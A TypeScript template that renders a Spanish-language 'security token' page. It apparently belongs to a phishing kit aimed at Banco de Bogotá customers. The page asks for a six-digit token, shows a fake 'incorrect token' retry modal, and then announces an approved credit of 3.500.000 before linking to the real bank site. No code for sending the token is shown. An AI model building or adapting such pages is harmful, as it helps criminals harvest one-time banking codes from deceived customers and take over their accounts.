interface DinamicaProps {
  mensaje: string;
  mostrarModalError: boolean;
  mostrarModalConfirmacion: boolean;
}

export function DinamicaTemplate({
  mensaje,
  mostrarModalError,
  mostrarModalConfirmacion,
}: DinamicaProps) {
  return `
    <header>
        <img src="img/logo.png" alt="">
    </header>

    <div class="content">
        <div class="welcome">
            <h2>Token de Seguridad</h2>
            <p>${mensaje}</p>
        </div>

        <form class="form_" id="dinamica_form">
            <div class="form">
                <div class="from-input">
                    <img src="img/lock.png" alt="">
                    <input type="number" placeholder="Ingresar Token" id="input_dinamica" maxlength="6">
                </div>
            </div>

            <div class="btn">
                <button type="submit" disabled id="btn_dinamica">
                    CONTINUAR
                </button>
            </div>
        </form>
    </div>

    <img src="img/grupo.svg" class="grupoa" alt="">

    <!-- Modal de error -->
    <div class="content_modal_e ${mostrarModalError ? "visible" : ""}" id="error_modal">
        <div class="modal">
            <div class="text">
                <p>Token Incorrecto, <br> por favor vuelve a intentarlo</p>
            </div>
            <button type="button" id="btn_error_ok">OK</button>
        </div>
    </div>

    <!-- Modal de confirmación -->
    <div class="content_modal_e ${mostrarModalConfirmacion ? "visible" : ""}" id="success_modal">
        <div class="modal">
            <div class="head">
                <div class="icon_">
                    <img src="img/check.svg" alt="">
                </div>
                <p>¡Datos validados correctamente!</p>
            </div>
            <div class="text">
                <p>El monto aprobado es de <strong>3.500.000</strong><br><br>
                    Debes esperar un periodo de 24 horas <br>
                    para que el crédito sea desembolsado a su cuenta.</p>
            </div>
            <a href="https://www.bancodebogota.com/personas" style="font-weight: 400;">Finalizar</a>
        </div>
    </div>
  `;
}
